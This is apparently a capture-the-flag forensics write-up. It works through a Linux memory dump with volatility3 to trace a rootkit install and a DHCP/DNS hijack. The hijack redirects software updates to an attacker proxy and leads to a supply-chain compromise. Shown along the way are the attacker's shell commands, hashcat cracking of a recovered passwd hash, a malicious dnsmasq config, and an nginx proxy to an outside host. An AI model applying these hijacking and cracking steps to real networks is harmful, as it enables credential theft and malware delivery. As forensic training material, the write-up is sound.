# The Tunnel Without Walls

```
A memory dump from a connected Linux machine reveals covert network connections, fake services, and unusual redirects. Holmes investigates further to uncover how the attacker is manipulating the entire network!
```

## Question #1

```
What is the Linux kernel version of the provided image? (string)
```

Use volatility3:

```shell
$ vol -f ../memdump.mem banners.Banner
Volatility 3 Framework 2.27.0
Progress:  100.00               PDB scanning finished
Offset  Banner

0x67200200      Linux version 5.10.0-35-amd64 (debian-kernel@lists.debian.org) (gcc-10 (Debian 10.2.1-6) 10.2.1 20210110, GNU ld (GNU Binutils for Debian) 2.35.2) #1 SMP Debian 5.10.237-1 (2025-05-19)
0x7f40ba40      Linux version 5.10.0-35-amd64 (debian-kernel@lists.debian.org) (gcc-10 (Debian 10.2.1-6) 10.2.1 20210110, GNU ld (GNU Binutils for Debian) 2.35.2) #1 SMP Debian 5.10.237-1 (2025-05-19)
```

Then, we can download the symbol files for volatility3:

```shell
cd volatility3/symbols/linux/
wget "https://github.com/Abyss-W4tcher/volatility3-symbols/raw/refs/heads/master/Debian/amd64/5.10.0/35/Debian_5.10.0-35-amd64_5.10.237-1_amd64.json.xz"
```

## Question #2

```
The attacker connected over SSH and executed initial reconnaissance commands. What is the PID of the shell they used? (number)
```

Use volatility3:

```shell
$ vol -vvv -f ../memdump.mem linux.bash.Bash
13608   bash    2025-09-03 08:16:48.000000 UTC  id
13608   bash    2025-09-03 08:16:52.000000 UTC
13608   bash    2025-09-03 08:16:52.000000 UTC  cat /etc/os-release
13608   bash    2025-09-03 08:16:58.000000 UTC  uname -a
13608   bash    2025-09-03 08:17:02.000000 UTC  ip a
13608   bash    2025-09-03 08:17:04.000000 UTC  0
13608   bash    2025-09-03 08:17:04.000000 UTC  ps aux
13608   bash    2025-09-03 08:17:25.000000 UTC  docker run -v /etc/:/mnt -it alpine
13608   bash    2025-09-03 08:18:11.000000 UTC  su jm
```

## Question #3

```
After the initial information gathering, the attacker authenticated as a different user to escalate privileges. Identify and submit that user's credentials. (user:password)
```

Use volatility3:

```shell
$ vol -vvv -f ../memdump.mem linux.pagecache.RecoverFs
$ unar recovered_fs.tar.gz
$ cat ./recovered_fs/92931307-c5fd-4804-94f2-a8287e677bd6/etc/passwd
jm:$1$jm$poAH2RyJp8ZllyUvIkxxd0:0:0:root:/root:/bin/bash
$ echo '$1$jm$poAH2RyJp8ZllyUvIkxxd0' > jm.hash
$ hashcat -O -a 0 -m 500 jm.hash ~/rockyou.txt -r /usr/share/hashcat/rules/best64.rule
$ hashcat --show -m 500 jm.hash
$1$jm$poAH2RyJp8ZllyUvIkxxd0:WATSON0
```

## Question #4

```
The attacker downloaded and executed code from Pastebin to install a rootkit. What is the full path of the malicious file? (/path/filename.ext)
```

Use volatility3:

```shell
$ vol -f ../memdump.mem linux.malware.hidden_modules.Hidden_modules
Volatility 3 Framework 2.27.0
Progress:  100.00               Stacking attempts finished
Offset  Module Name     Code Size       Taints  Load Arguments  File Output

0xffffc0aa0040  Nullincrevenge  0x4000  OOT_MODULE,UNSIGNED_MODULE              N/A
/usr/lib/modules/5.10.0-35-amd64/kernel/lib/Nullincrevenge.ko
$ find . | grep revenge
./recovered_fs/92931307-c5fd-4804-94f2-a8287e677bd6/usr/lib/modules/5.10.0-35-amd64/kernel/lib/Nullincrevenge.ko
```

## Question #5

```
What is the email account of the alleged author of the malicious file? (user@example.com)
```

Use modinfo:

```shell
$ /sbin/modinfo ./recovered_fs/92931307-c5fd-4804-94f2-a8287e677bd6/usr/lib/modules/5.10.0-35-amd64/kernel/lib/Nullincrevenge.ko
filename:       /home/jiegec/ctf/holmesctf2025/volatility3/./recovered_fs/92931307-c5fd-4804-94f2-a8287e677bd6/usr/lib/modules/5.10.0-35-amd64/kernel/lib/Nullincrevenge.ko
description:    NULLINC REVENGE IS COMING...
license:        GPL
author:         i-am-the@network.now
depends:
retpoline:      Y
name:           Nullincrevenge
vermagic:       5.10.0-35-amd64 SMP mod_unload modversions
```

## Question #6

```
The next step in the attack involved issuing commands to modify the network settings and installing a new package. What is the name and PID of the package? (package name,PID)
```

From bash history:

```shell
$ vol -vvv -f ../memdump.mem linux.bash.Bash
22714   bash    2025-09-03 08:20:31.000000 UTC  apt install -y dnsmasq
22714   bash    2025-09-03 08:20:50.000000 UTC  rm /etc/dnsmasq.conf
22714   bash    2025-09-03 08:20:56.000000 UTC  nano /etc/dnsmasq.conf
22714   bash    2025-09-03 08:21:23.000000 UTC  systemctl enable --now dnsmasq
22714   bash    2025-09-03 08:21:30.000000 UTC  systemctl restart dnsmasq
$ vol -f ../memdump.mem linux.psaux.PsAux
38687   1       dnsmasq /usr/sbin/dnsmasq -x /run/dnsmasq/dnsmasq.pid -u dnsmasq -7 /etc/dnsmasq.d,.dpkg-dist,.dpkg-old,.dpkg-new --local-service --trust-anchor=.,20326,8,2,E06D44B80B8F1D39A95C0B0D7C65D08458E880409BBC683457104237C7F8EC8D --trust-anchor=.,38696,8,2,683D2D0ACB8C9B712A1948B27F741219298D0A450D612C483AF444A4C0FB2B16
```

## Question #7

```
Clearly, the attacker's goal is to impersonate the entire network. One workstation was already tricked and got its new malicious network configuration. What is the workstation's hostname?
```

From recovered fs:

```shell
$ cat recovered_fs/92931307-c5fd-4804-94f2-a8287e677bd6/var/lib/misc/dnsmasq.leases
1:1756891471 00:50:56:b4:32:cd 192.168.211.52 Parallax-5-WS-3 01:00:50:56:b4:32:cd
```

## Question #8

```
After receiving the new malicious network configuration, the user accessed the City of CogWork-1 internal portal from this workstation. What is their username? (string)
```

Search for HTTP requests in the memory dump:

```
POST /index.php HTTP/1.1^M
Host: 10.129.232.25:8081^M
Connection: keep-alive^M
Content-Length: 43^M
Cache-Control: max-age=0^M
Origin: http://10.129.232.25:8081^M
Content-Type: application/x-www-form-urlencoded^M
Upgrade-Insecure-Requests: 1^M
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36 Edg/139.0.0.0^M
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7^M
Referer: http://10.129.232.25:8081/^M
Accept-Encoding: gzip, deflate^M
Accept-Language: en-US,en;q=0.9^M
Cookie: PHPSESSID=189b027ab0e5e10f496e57953544cd74^M
^M
username=mike.sullivan&password=Pizzaaa1%21
```

## Question #9

```
Finally, the user updated a software to the latest version, as suggested on the internal portal, and fell victim to a supply chain attack. From which Web endpoint was the update downloaded?
```

Grep for HTTP requests:

```shell
$ strings ../memdump.mem | grep "GET "
192.168.211.52 - - [03/Sep/2025:08:25:48 +0000] "GET /win10/update/CogSoftware/AetherDesk-v74-77.exe HTTP/1.1" 200 12084 "-" "AetherDesk/73.0 (Windows NT 10.0; Win64; x64)" "-"
```

## Question #10

```
To perform this attack, the attacker redirected the original update domain to a malicious one. Identify the original domain and the final redirect IP address and port. (domain,IP:port)
```

From recovered fs:

```shell
$ cat recovered_fs/92931307-c5fd-4804-94f2-a8287e677bd6/etc/dnsmasq.conf
interface=ens224

dhcp-range=192.168.211.30,192.168.211.240,1h
dhcp-option=3,192.168.211.8
dhcp-option=6,192.168.211.8

no-hosts
no-resolv
server=8.8.8.8
address=/updates.cogwork-1.net/192.168.211.8

log-queries=no
quiet-dhcp
quiet-dhcp6
log-facility=/dev/null
$ cat recovered_fs/92931307-c5fd-4804-94f2-a8287e677bd6/tmp/default.conf
server {
    listen 80;

    location / {
        proxy_pass http://13.62.49.86:7477/;
        proxy_set_header Host jm_supply;
    }
}
```
